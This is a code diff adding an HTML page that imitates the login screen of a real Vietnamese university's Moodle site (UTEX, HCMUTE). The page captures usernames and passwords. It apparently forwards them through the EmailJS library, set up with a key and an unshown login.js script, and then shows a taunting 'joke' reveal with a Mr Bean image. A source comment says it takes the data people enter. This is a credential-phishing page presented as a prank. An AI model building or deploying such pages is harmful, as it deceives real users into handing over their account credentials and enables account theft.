@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>UTEX Login</title>
+    <link rel="shortcut icon" href="https://utex.hcmute.edu.vn/theme/image.php/maker/theme/1634220818/favicon" />
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
+        integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" rel="stylesheet" />
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" rel="stylesheet" />
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="keywords" content="moodle, TRƯỜNG ĐẠI HỌC SƯ PHẠM KỸ THUẬT TP.HCM: Đăng nhập vào trang" />
+    <link rel="stylesheet" type="text/css"
+        href="https://utex.hcmute.edu.vn/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple-min.css" />
+    <script id="firstthemesheet"
+        type="text/css">/** Required in order to fix style inclusion problems in IE with YUI **/</script>
+    <link rel="stylesheet" type="text/css" href="https://utex.hcmute.edu.vn/theme/styles.php/maker/1634220818_1/all" />
+    <link rel="stylesheet" href="./assets/style.css">
+</head>
+
+<body>
+
+    <div id="page-wrapper" class="page-wrapper has-bg-image has-bg-mask has-logo">
+
+        <div>
+            <a class="sr-only sr-only-focusable" href="#maincontent">Chuyển tới nội dung chính</a>
+        </div>
+
+        <div id="page" class="container-fluid">
+            <div id="page-content">
+                <div id="region-main-box">
+                    <section id="region-main">
+
+                        <span class="notifications" id="user-notifications"></span>
+                        <div role="main"><span id="maincontent"></span>
+                            <div class="auth-blocks-wrapper justify-content-center">
+                                <div class="login-block">
+                                    <div class="block-inner">
+                                        <div class="block-title">
+                                            <h2 class="login-sitename"><a href="https://utex.hcmute.edu.vn">TRƯỜNG ĐẠI
+                                                    HỌC SƯ PHẠM KỸ THUẬT TP.HCM</a></h2>
+
+                                        </div>
+                                        <div class="row">
+
+                                            <div class="form-col col-lg-6 col-12">
+                                                <!--Lay data nguoi ta nhap vao-->
+                                                <form class="login-form" action="#" method="" id="login">
+                                                    <div class="form-group username">
+                                                        <i class="fa fa-user" aria-hidden="true"></i>
+                                                        <label for="username" class="sr-only">
+                                                            Tên tài khoản
+                                                        </label>
+
+                                                        <input type="text" name="username" id="username"
+                                                            class="form-control login-username" value=""
+                                                            placeholder="Tên tài khoản" autocomplete="username">
+                                                    </div>
+                                                    <!--//form-group-->
+                                                    <div class="form-group password">
+                                                        <i class="fa fa-lock" aria-hidden="true"></i>
+                                                        <label for="password" class="sr-only">Mật khẩu</label>
+
+                                                        <input type="password" name="password" id="password" value=""
+                                                            class="form-control login-password" placeholder="Mật khẩu"
+                                                            autocomplete="current-password">
+                                                    </div>
+                                                    <!--//form-group-->
+                                                    <button type="submit" class="btn btn-primary btn-block mt-1"
+                                                        id="loginbtn">Đăng nhập</button>
+
+                                                    <div class="rememberpass">
+                                                        <input type="checkbox" name="rememberusername"
+                                                            id="rememberusername" value="1" />
+                                                        <label for="rememberusername">Nhớ tên tài khoản</label>
+                                                    </div>
+                                                </form>
+
+
+
+
+                                            </div>
+                                            <!--//form-col-->
+
+                                            <div class="info-col col-lg-6 col-12">
+
+                                                <style>
+
+                                                </style>
+                                                <div class="oauth-wrapper">
+                                                    <h6 class="oauth-title">Đăng nhập bằng tài khoản của bạn trên:</h6>
+                                                    <div class="potentialidplist">
+                                                        <div class="potentialidp">
+                                                            <a href="#" title="Google"
+                                                                class="btn btn-social btn-Google btn-block ">
+                                                                <img class="social-icon-image"
+                                                                    src="https://accounts.google.com/favicon.ico" alt=""
+                                                                    width="24" height="24">
+                                                                <span class="btn-text">Google</span>
+                                                            </a>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="cookies">
+                                                    Trình duyệt của bạn cần phải mở chức năng quản lí cookie
+                                                    <a class="btn btn-link p-a-0" role="button" data-container="body"
+                                                        data-toggle="popover" data-placement="bottom" data-content="<div class=&quot;no-overflow&quot;><p>Hai cookies được dùng bởi site này:</p>
+                                
+                                <p>Cookie chính là session cookie, thường được gọi là MoodleSession.  Bạn phải cho phép cookie này trong trình duyệt của bạn để cung cấp tính liên tục và bảo đảm duy trì đăng nhập của bạn từ trang này sang trang khác. Khi bạn đăng xuất hoặc đóng trình duyệt thì cookie này sẽ bị huỷ (ở trình duyệt của bạn và trên server).</p>
+                                
+                                <p>Cookie khác được dùng để tăng thêm tính thuận tiện, thường được gọi là MOODLEID.  Nó chỉ nhớ tên đăng nhập của bạn trong trình duyệt. Điều này có nghĩa là khi bạn quay trở lại site này trường tên đăng nhập trên trang đăng nhập sẽ được điền vào cho bạn. Nếu muốn an toàn bạn có thể huỷ  - khi đó bạn sẽ chỉ phải gõ lại tên đăng nhập của bạn mỗi lần bạn đăng nhập.</p>
+                                </div> " data-html="true" tabindex="0" data-trigger="focus">
+                                                        <i class="icon fa fa-question-circle text-info fa-fw "
+                                                            title="Trợ giúp về Trình duyệt của bạn cần phải mở chức năng quản lí cookie"
+                                                            aria-label="Trợ giúp về Trình duyệt của bạn cần phải mở chức năng quản lí cookie"></i>
+                                                    </a>
+                                                </div>
+
+                                            </div>
+                                            <!--//info-col-->
+                                        </div>
+                                        <!--//row-->
+                                    </div>
+                                </div>
+                            </div>
+                            <!--//auth-blocks-wrapper-->
+                        </div>
+                    </section>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!---Joker-->
+    <div class="joke">
+        <h2>Aiss đồ ngốc! Cưng đang làm cái quái gì vậy hả??</h2>
+        <img src="./assets/images/MrBean.gif" alt="joke-img">
+        <p>Check mail để có bất ngờ!!!!!</p>
+        <audio src="./sounds/ohNo.mp3" id="joke-audio"></audio>
+    </div>
+    <script src="./js/login.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("lqcl9TKhDnDOVxA1N");
+        })();
+    </script>
+</body>
+
+</html>
